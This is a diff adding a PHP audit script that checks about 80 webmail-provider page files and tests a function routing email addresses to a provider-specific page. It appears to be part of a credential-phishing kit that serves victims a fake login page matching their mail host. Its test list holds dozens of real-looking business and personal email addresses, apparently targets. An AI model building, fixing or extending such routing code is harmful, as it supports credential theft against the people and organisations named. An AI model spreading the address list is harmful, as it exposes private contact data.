@@ -1,0 +1,226 @@
+<?php
+// ============================================================
+// check-all.php — Temporary. DELETE AFTER USE.
+// Audits all provider mappings, asset files, and routing decisions.
+// ============================================================
+header('Content-Type: text/plain; charset=utf-8');
+
+echo "=== check-all.php ===\n";
+echo "Time: " . date('c') . "\n";
+echo "Root: " . __DIR__ . "\n\n";
+
+if (!file_exists(__DIR__ . '/index-functions.php')) {
+    exit("index-functions.php NOT FOUND — upload it first.\n");
+}
+require_once __DIR__ . '/index-functions.php';
+
+// Clear cache
+echo "=== Clearing route cache ===\n";
+$files = glob(sys_get_temp_dir() . '/webmail_route_*.txt');
+$cleared = 0;
+foreach ($files as $cf) {
+    if (@unlink($cf)) $cleared++;
+}
+echo "  Cleared: $cleared files\n\n";
+
+// Provider asset audit
+$providerAssets = [
+    'all.php', 'rc.php', 'cpw.php',
+    'aruba.php', 'emailsrvr.php', 'yahoo.php', 'google.php',
+    '126.php', '263.php', 'office.php', 'office_cn.php',
+    'mailaliyun.php', 'aol.php', 'private.php', 'mxhichina.php',
+    'bossmail.php', 'one.php', 'natro.php', 'hostinger.php',
+    'hostedemail.php', 'comcast.php', 'mimecast.php', 'rediffmailpro.php',
+    'gmx.php', 'godaddy.php', 'yunyou.php', 'ionos.php', 'interia.php',
+    'zimbra.php', 'registerit.php', 'globalmail.php', 'naver.php',
+    'cybermail.php', 'netease.php', 'netsol.php', 'protonmail.php',
+    'qq.php', 'dreamhost.php', 'nc.php', 'orangepl.php', 'konsolh.php',
+    'strato.php', 'telkomsa.php', 'wadax.php', 'windstream.php',
+    'zoho.php', 'owa.php', 'smarsh.php', 'worksmobile.php',
+    'mailplug.php', 'fastmail.php', 'udomain.php', 'ovhcloud.php',
+    'mailgun.php', 'lolipop.php', 'mweb.php', '163.php',
+    'bizmail.php', 'uol.php', 'locaweb.php', 'terrabr.php',
+    'userver.php', 'connect.php', 'smarter.php', 'horde.php',
+    'daum.php', 'mailcom.php', 'enable.php', 'squirrel.php',
+    'icewarp.php', 'mdaemon.php', 'kerio.php', 'afterlogic.php',
+    'zoner.php', 'mailcow.php', 'mail2000.php', 'mailnara.php',
+    'kasserver.php', 'maychuemail.php', 'apsuite.php',
+];
+
+echo "=== Provider asset audit (assets/*.php) ===\n";
+$assetMissing = [];
+$assetFound = [];
+foreach ($providerAssets as $asset) {
+    $path = __DIR__ . '/assets/' . $asset;
+    if (file_exists($path)) {
+        $assetFound[] = $asset;
+    } else {
+        $assetMissing[] = $asset;
+    }
+}
+echo "FOUND:   " . count($assetFound) . "/" . count($providerAssets) . "\n";
+echo "MISSING: " . count($assetMissing) . "/" . count($providerAssets) . "\n";
+if ($assetMissing) {
+    echo "\nMissing assets:\n";
+    foreach ($assetMissing as $a) echo "  ❌ assets/$a\n";
+} else {
+    echo "  ✅ All assets present\n";
+}
+echo "\n";
+
+// Batch routing tests
+$testCases = [
+    'sales@disc.ie'                        => 'smarter.php',
+    'test@apart-rent.com'                  => 'cpw.php',
+    'info@alimexports.com'                 => 'smarter.php',
+    'test@gmail.com'                       => 'google.php',
+    'test@zoho.com'                        => 'zoho.php',
+    'marketing@aikosolar.com'              => '263.php',
+    'alianchen@finexfastener.com'          => 'mxhichina.php',
+    'aaron@hummingcomm.com'                => 'mxhichina.php',
+    'alenyung@sinobender.com'              => 'globalmail.php',
+    'dade@nfhj.com'                        => 'netease.php',
+    'info@giacomini.fr'                    => 'ovhcloud.php',
+    'africasale@peiyangchem.com'           => 'qq.php',
+    'chungsoo_inst@chungsooinst.com'       => 'naver.php',
+    'info@masseytractorparts.com'          => 'hostedemail.php',
+    'boss@luxicn.com'                      => 'hostinger.php',
+    'info@hdl-gmbh.com'                    => 'ionos.php',
+    'adestasio@drenopompe.it'              => 'aruba.php',
+    'jose.marcio@arbustec.com.br'          => 'locaweb.php',
+    'cto.co@mail.com'                      => 'mailcom.php',
+    'hds-hds@iafrica.com'                  => 'mweb.php',
+    'contact@arthurverschaeve.be'          => 'one.php',
+    'bdfeida@163.com'                      => '163.php',
+    'beijing12345@126.com'                 => '126.php',
+    'design.kl@minutemanpress.com'         => 'emailsrvr.php',
+    'parsa@k-drillingfluids.com'           => 'enable.php',
+    'gangadhararaoirlapati@protonmail.com' => 'protonmail.php',
+    'william.morrison@undervisionsewercamera.com' => 'bizmail.php',
+    'y_himri@yahoo.com'                    => 'yahoo.php',
+    'y_himri@aol.com'                      => 'aol.php',
+    'info@schindmachines.com'              => 'natro.php',
+    'pacv@afribone.net.gn'                 => 'zimbra.php',
+    'reservations@thegreenhillhotel.co.uk' => 'zoho.php',
+    'marcioboente@uol.com.br'              => 'uol.php',
+    'contato@biosulconsultoria.com.br'     => 'userver.php',
+    'apark@seawayglobal.com'               => 'worksmobile.php',
+    'stankusheating@windstream.net'        => 'windstream.php',
+    'contact@homephysiotherapyexercises.com' => 'rc.php',
+    'emmanuele@fumagalli.it'               => 'registerit.php',
+    'hotransz@hotransz.hu'                 => 'rc.php',
+    'tom@accu-tempinc.com'                 => 'dreamhost.php',
+    'sales@zerenex-molecular.com'          => 'cpw.php',
+    'test@connect.com.fj'                  => 'connect.php',
+    'info@chemat.com'                      => 'netsol.php',
+    'contact@jayateknik.com'               => 'mdaemon.php',
+    'info@air-industrial.gr'               => 'horde.php',
+    'info@qenergy.eu'                      => 'office.php',
+    'pt7wa@terra.com.br'                   => 'terrabr.php',
+    'pt7wa@comcast.net'                    => 'comcast.php',
+    'divyeshbardoliwala@lexus-com.com'     => 'godaddy.php',
+    'info@suministrosorduna.com'           => 'mailgun.php',
+    'oriental@orientalconstructionkenya.com' => 'private.php',
+    'purchase05@industrialsltd.com'        => 'mailcow.php',
+    'nairobikenya@sbtjapan.com'            => 'cybermail.php',
+    'info@nghisonfoodsgroup.com'           => 'icewarp.php',
+    'liwei@asahi-yukizaijushi.com.cn'      => 'office_cn.php',
+    'us.connect@maynepharma.com'           => 'mimecast.php',
+    'info@akihikomatsumoto.com'            => 'lolipop.php',
+    'jdakenova@piumotc.kg'                 => 'kerio.php',
+    'parts@controlmastersinc.com'          => 'fastmail.php',
+    'daniel@iplsc.com'                     => 'interia.php',
+    'daniel@gmx.com'                       => 'gmx.php',
+    'nx@xin.us'                            => 'yunyou.php',
+    'amrish.patel@securitiesamerica.com'   => 'smarsh.php',
+    'leipzighanin@hanmail.net'             => 'daum.php',
+    'andy.thomas@buyerdock.com'            => 'owa.php',
+    'arsakl@arsa.com.my'                   => 'squirrel.php',
+    'minakotti@studio-273.com'             => 'wadax.php',
+    'sales@optimum.com.hk'                 => 'udomain.php',
+    'laura@healthywithhoney.com'           => 'nc.php',
+    'sales@laball.co.kr'                   => 'mailnara.php',
+    'reservations@smokyfallsresort.com'    => 'apsuite.php',
+    'info@aufsboot.ch'                     => 'all.php',
+];
+
+echo "=== Batch routing tests ===\n";
+echo "Format: email | expected | actual | status\n\n";
+
+$pass = 0;
+$fail = 0;
+$fails = [];
+
+foreach ($testCases as $email => $expected) {
+    $actual = getMxFile($email);
+    $status = ($actual === $expected) ? 'PASS' : 'FAIL';
+
+    if ($status === 'PASS') {
+        $pass++;
+    } else {
+        $fail++;
+        $fails[] = [$email, $expected, $actual];
+    }
+
+    printf("  %-45s | %-18s | %-30s | %s\n",
+        $email, $expected, var_export($actual, true), $status);
+}
+
+echo "\nPASS: $pass / " . count($testCases) . "\n";
+echo "FAIL: $fail / " . count($testCases) . "\n";
+
+if ($fails) {
+    echo "\nFailed cases:\n";
+    foreach ($fails as [$email, $expected, $actual]) {
+        echo "  $email\n";
+        echo "    expected: $expected\n";
+        echo "    actual:   $actual\n";
+    }
+}
+echo "\n";
+
+// Auth.php whitelist vs disk
+echo "=== Auth.php whitelist vs assets/ on disk ===\n";
+if (file_exists(__DIR__ . '/auth.php')) {
+    $authSrc = file_get_contents(__DIR__ . '/auth.php');
+    if (preg_match("/\\\$allowed_files\s*=\s*\[(.*?)\];/s", $authSrc, $m)) {
+        preg_match_all("/'([a-z0-9_.]+\.php)'/i", $m[1], $matches);
+        $whitelisted = array_unique($matches[1]);
+        echo "Whitelisted in auth.php: " . count($whitelisted) . " files\n\n";
+        $missingOnDisk = [];
+        foreach ($whitelisted as $w) {
+            if (!file_exists(__DIR__ . '/assets/' . $w)) {
+                $missingOnDisk[] = $w;
+            }
+        }
+        if ($missingOnDisk) {
+            echo "Whitelisted but NOT on disk:\n";
+            foreach ($missingOnDisk as $miss) {
+                echo "  ❌ assets/$miss\n";
+            }
+        } else {
+            echo "  ✅ All whitelisted files exist on disk\n";
+        }
+    } else {
+        echo "  Could not parse \$allowed_files array from auth.php\n";
+    }
+} else {
+    echo "  auth.php not found\n";
+}
+echo "\n";
+
+echo "=== SUMMARY ===\n";
+echo "Assets found:   " . count($assetFound) . " / " . count($providerAssets) . "\n";
+echo "Assets missing: " . count($assetMissing) . "\n";
+echo "Routing tests:  $pass pass, $fail fail\n\n";
+echo "=== ACTIONS ===\n";
+if ($assetMissing) {
+    echo "1. Assets missing: " . implode(', ', $assetMissing) . "\n\n";
+}
+if ($fail > 0) {
+    $scriptDir = rtrim(str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? '/')), '/');
+    $baseUrl   = ($_SERVER['HTTP_HOST'] ?? 'localhost') . $scriptDir;
+    echo "2. Routing failures detected. Inspect each with:\n";
+    echo "   https://{$baseUrl}/check.php?inspect=DOMAIN\n\n";
+}
+echo "3. DELETE check-all.php and check.php when done.\n";
